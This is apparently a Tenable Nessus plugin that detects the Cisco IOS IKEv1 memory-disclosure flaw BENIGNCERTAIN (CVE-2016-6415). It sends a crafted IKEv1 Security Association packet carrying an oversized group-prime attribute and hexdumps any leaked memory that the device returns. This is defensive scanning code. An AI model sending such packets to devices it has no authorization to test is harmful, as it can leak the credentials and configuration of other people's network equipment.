#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(96802);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2017/01/30 15:10:02 $");

  script_cve_id("CVE-2016-6415");
  script_bugtraq_id(93003);
  script_osvdb_id(144404);
  script_xref(name:"CISCO-BUG-ID", value:"CSCvb29204");
  script_xref(name:"CISCO-SA", value:"cisco-sa-20160916-ikev1");

  script_name(english:"Cisco IOS IKEv1 Packet Handling Remote Information Disclosure (cisco-sa-20160916-ikev1) (BENIGNCERTAIN) (uncredentialed check)");
  script_summary(english:"Checks IKEv1 Security Association negotiation response.");

  script_set_attribute(attribute:"synopsis", value:
"A remote device is affected by an information disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The IKE service running on the remote Cisco IOS device is affected by
an information disclosure vulnerability, known as BENIGNCERTAIN, in
the Internet Key Exchange version 1 (IKEv1) subsystem due to improper
handling of IKEv1 security negotiation requests. An unauthenticated,
remote attacker can exploit this issue, via a specially crafted IKEv1
packet, to disclose memory contents, resulting in the disclosure of
confidential information including credentials and configuration
settings.

BENIGNCERTAIN is one of multiple Equation Group vulnerabilities and
exploits disclosed on 2016/08/14 by a group known as the Shadow
Brokers.");
  # https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160916-ikev1
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b7f2c76c");
  # https://www.riskbasedsecurity.com/2016/08/the-shadow-brokers-lifting-the-shadows-of-the-nsas-equation-group/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4c7e0cf3");
  script_set_attribute(attribute:"see_also", value:"https://blogs.cisco.com/security/shadow-brokers");
  script_set_attribute(attribute:"solution", value:
"Upgrade to the relevant fixed version referenced in Cisco bug ID
CSCvb29204.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/08/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/09/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/01/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:cisco:ios");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CISCO");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("ike2_detect.nasl");
  script_require_ports("Services/udp/ikev1", 500, 848);

  exit(0);
}

include('audit.inc');
include('global_settings.inc');
include('misc_func.inc');
include('byte_func.inc');
include('ike.inc');
include('dump.inc');

port = branch(make_list(500, 848));

soc = open_sock_udp(port);
if (! soc) 
  audit(AUDIT_SOCK_FAIL, port, 'UDP');

attr_enc = ike_attr(type: IKE1_ATTR_ENC, value:IKE1_ENC_CAST_CBC);
attr_lifet = ike_attr(type:IKE1_ATTR_LIFE_TYPE, value:IKE1_LIFE_TYPE_SECS);
attr_lifed = ike_attr(type:IKE1_ATTR_LIFE_DURATION, value:2147483);
attr_hash = ike_attr(type: IKE1_ATTR_HASH, value:IKE1_HASH_SHA1);
attr_group = ike_attr(type: IKE1_ATTR_GROUP_DESCR, value:IKE_GROUP_MODP_768);
grp_prime = crap(data:'A', length: 1000);
attr_grp_prime = ike_attr(type: IKE1_ATTR_GROUP_PRIME_POLY, value: grp_prime); 
attr_auth = ike_attr(type: IKE1_ATTR_AUTH, value:IKE1_AUTH_PSK);

attrs = 
  attr_enc + 
  attr_lifet +
  attr_lifed +
  attr_hash + 
  attr_group +
  attr_grp_prime + 
  attr_auth;

xforms[0] = ike1_payload_xform(next:IKE1_PAYLOAD_NONE, num: 1, id: KEY_IKE, attrs: attrs);

spi = rand_str(length:4); 
proposal=  ike1_payload_prop(next: IKE1_PAYLOAD_NONE,
                             num: 1,
                             proto: PROTO_ISAKMP,
                             spi: spi,
                             xforms: xforms);

sa = ike1_payload_sa(next: IKE1_PAYLOAD_NONE,
                     doi: DOI_IPSEC,
                     situation: SIT_IDENTITY,
                     proposals: proposal
                     );

# SA is the only payload in the first exchange in Main Mode
payloads = sa;

#
# Create a IKEv1 PDU
#
icookie = rand_str(length:8);
rcookie = crap(data:'\x00', length:8);
hdr = ike1_hdr( icookie: icookie,
                rcookie: rcookie,
                payload: IKE1_PAYLOAD_SA,
                exch: IKE1_MAIN_MODE, 
                flags: 0,
                msgid: 0,
                len:IKE_HDR_SIZE + strlen(payloads));
                 
pdu = hdr + payloads;


res = ike1_sendrecv(socket: soc, data:pdu);
close(soc);
if(isnull(res)) 
  exit(0, 'No response from UDP port '+port+' to an IKEv1 Security Association negotiation request.');

# Parse the response
ret = ike1_parse(res);
if(isnull(ret))
  audit(code:1, AUDIT_RESP_BAD, port,'an IKEv1 Security Association negotiation request: invalid IKEv1 packet', 'UDP');

hdr       = ret['hdr'];
payloads  = ret['payloads'];
 
if(isnull(hdr))       exit(1,'Failed to get IKEv1 header in the response.');
if(isnull(payloads))  exit(1,'Failed to get any IKEv1 payload in the response.');

# - We offered an unacceptable SA.
# - Affected cisco devices should return a 
#   Informational exchange with a Notification payload.
if(hdr['exch'] != ISAKMP_EXCH_INFORMATIONAL)
  exit(0, 'The remote IKEv1 daemon does not return an Informational Exchange; it may not be affected.');

# First payload should be a Notification payload
if (hdr['np'] != IKE1_PAYLOAD_NOTIFY)
{
  audit(code:1, AUDIT_RESP_BAD, port,'an SA negotiation: Notification payload not the first payload in an Informational Exchange.', 'UDP');
}

p = payloads[0];  
pdata = p['raw_data'];   
if(empty_or_null(pdata))
  audit(AUDIT_RESP_BAD, port,'an SA negotiation: No data in the Notification payload.', 'UDP');
 
notify = ike1_parse_notify(pdata); 
if(empty_or_null(notify))
  audit(AUDIT_FN_FAIL, 'ike1_parse_notify');

# Notify Message Type should be NO-PROPOSAL-CHOSEN
if(notify['type'] != IKN1_NO_PROPOSAL_CHOSEN)
{
  audit(AUDIT_RESP_BAD, port,'an SA negotiation: Notification message type not NO-PROPOSAL-CHOSEN.', 'UDP');
}

ndata = notify['data'];

# Not affected:
#   - No data in the Notification payload or
#   - The entire offered SA is returned in the Notification payload.
if (! ndata         # seen in: libreswan 
    || ndata == sa  # seen in: Cisco ASA
  )
{
  audit(AUDIT_HOST_NOT, 'affected'); 
}
# Patched:
#   - Only the hdr, DOI and Situation fields of the offered 
#     SA are returned.
#   - The offered proposal is NOT returned.
else if (ndata == substr(sa, 0, 11))
{
  exit(0, 'The remote host is patched.'); 
} 
# Vulnerable:
#   - Returned Proposal payload in the notification does not 
#     match what we sent.
#   - The data in the returned Proposal payload may come
#     from some memory location. 
else if ( strlen(ndata) > 12 &&
          substr(ndata, 0, 11) == substr(sa, 0, 11) &&
          substr(ndata, 12) != proposal 
        )
       
{
  report = 'Memory content was returned in the following Notification payload : \n\n' + 
    hexdump(ddata:pdata);

  security_report_v4(
    port      : port, 
    proto     : 'udp',
    severity  : SECURITY_WARNING, 
    extra     : report
  );
}
# Unexpected
else
{
  audit(AUDIT_RESP_BAD, port,'an SA negotiation. Unexpected Notification payload:\n' + hexdump(ddata:pdata), 'UDP');
}
